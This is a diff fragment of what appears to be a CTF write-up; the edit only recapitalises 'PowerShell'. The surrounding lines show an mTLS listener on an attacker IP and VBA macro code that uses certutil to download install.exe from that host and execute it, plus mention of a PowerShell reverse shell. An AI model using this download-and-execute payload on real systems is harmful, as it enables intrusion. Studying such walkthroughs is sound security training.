@@ -121,7 +121,7 @@ upx
 mtls -L 192.168.45.173 -l 4445
 ```
 
-Tried `C:\Windows\Temp`, but I probably did not have permissions as this is most probably a later Windows 10 machine, I also add simple powershell reverse shell just because it is a CTF so more attempt in one go the better.
+Tried `C:\Windows\Temp`, but I probably did not have permissions as this is most probably a later Windows 10 machine, I also add simple PowerShell reverse shell just because it is a CTF so more attempt in one go the better.
 ```vb
 Shell("certutil.exe -urlcache -split -f 'http://192.168.45.173/install.exe' 'C:\programdata\install.exe'")
 Shell("C:\programdata\install.exe")
